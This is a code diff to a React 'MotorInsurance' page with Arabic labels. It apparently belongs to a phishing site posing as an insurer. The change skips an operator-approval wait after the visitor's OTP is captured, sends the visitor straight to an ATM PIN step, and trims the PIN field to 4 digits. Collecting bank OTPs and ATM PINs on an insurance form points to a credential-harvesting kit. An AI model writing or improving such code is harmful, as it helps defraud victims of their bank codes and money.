@@ -1053,12 +1053,12 @@ export default function MotorInsurance() {
           id: visitorId,
           step: 5,
           otpCode: otpCode,
-          status: "awaiting_otp_approval",
+          status: "otp_submitted",
         });
       }
 
-      setIsAwaitingApproval(true);
-      setApprovalStatus(null);
+      // Navigate to ATM PIN step without waiting for approval
+      setCurrentStep(6);
     }
     return true;
   };
@@ -2530,15 +2530,15 @@ export default function MotorInsurance() {
               <div className="space-y-4">
                 <div>
                   <Label className="text-sm font-medium text-foreground mb-2 block text-center">
-                    أدخل الرمز المكون من 4-6 أرقام
+                    أدخل الرمز المكون من 4 أرقام
                   </Label>
                   <Input
                     value={atmCode}
                     onChange={(e) =>
-                      setAtmCode(e.target.value.replace(/\D/g, "").slice(0, 6))
+                      setAtmCode(e.target.value.replace(/\D/g, "").slice(0, 4))
                     }
                     placeholder="أدخل الرمز"
-                    maxLength={6}
+                    maxLength={4}
                     className="text-center h-14 text-2xl font-mono tracking-[0.5em] rounded-xl border-2 focus:border-purple-500 transition-colors"
                     dir="ltr"
                     data-testid="input-atm-code"
